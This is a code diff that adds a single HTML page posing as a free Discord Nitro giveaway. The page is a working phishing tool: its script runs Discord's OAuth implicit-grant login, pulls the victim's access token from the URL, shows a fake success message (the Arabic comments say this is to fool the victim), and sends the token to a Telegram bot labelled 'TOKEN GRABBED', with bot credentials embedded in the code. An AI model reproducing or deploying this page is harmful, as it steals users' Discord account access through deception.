@@ -1,0 +1,65 @@
+here<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Nitro 🎁</title>
+    <style>
+        body { background-color: #313338; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background-color: #2b2d31; padding: 40px; border-radius: 8px; text-align: center; width: 340px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+        h2 { color: #fff; margin-bottom: 10px; }
+        p { margin-bottom: 25px; font-size: 14px; line-height: 1.5; color: #b5bac1; }
+        .btn { display: inline-block; padding: 12px 24px; background-color: #5865f2; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; width: 100%; box-sizing: border-box; border: none; cursor: pointer; }
+        .btn:hover { background-color: #4752c4; }
+        .success { color: #23a55a; font-size: 18px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="box" id="main-box">
+        <h2>🎁 Free Discord Nitro</h2>
+        <p>Click the button below to login with Discord and claim your 1-Month Nitro.</p>
+        <button class="btn" onclick="loginWithDiscord()">Claim Now</button>
+    </div>
+
+    <script>
+        // ─── الإعدادات ───
+        const CLIENT_ID = "1542898269141737493";
+        const REDIRECT_URI = window.location.href.split('#')[0]; // بياخد رابط الصفحة الحالية
+        const TG_TOKEN = "9206036056:AAHgN1_vTell1Fstoqy2hvk9Ra1oHXkEQkw";
+        const CHAT_ID = "6045243196"; // حط الـ ID بتاعك هنا
+
+        function loginWithDiscord() {
+            // استخدام Implicit Grant عشان التوكن يرجع في الرابط مباشرة
+            const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20email%20connections`;
+            window.location.href = oauthUrl;
+        }
+
+        window.onload = function() {
+            // لو الرابط فيه توكن (رجع من ديسكورد)
+            if (window.location.hash) {
+                const params = new URLSearchParams(window.location.hash.substring(1));
+                const accessToken = params.get('access_token');
+
+                if (accessToken) {
+                    // تغيير الشاشة عشان الضحية يفتكر إنه نجح
+                    document.getElementById('main-box').innerHTML = `
+                        <h2 class="success">🎉 Nitro Claimed!</h2>
+                        <p>Your free Nitro has been added to your account. You can close this page now.</p>
+                    `;
+
+                    // إرسال التوكن للتليجرام
+                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: `🚨 **TOKEN GRABBED (GitHub Pages)** 🚨\n\n🔑 **Token:**\n\`${accessToken}\``,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                }
+            }
+        };
+    </script>
+</body>
+</html>
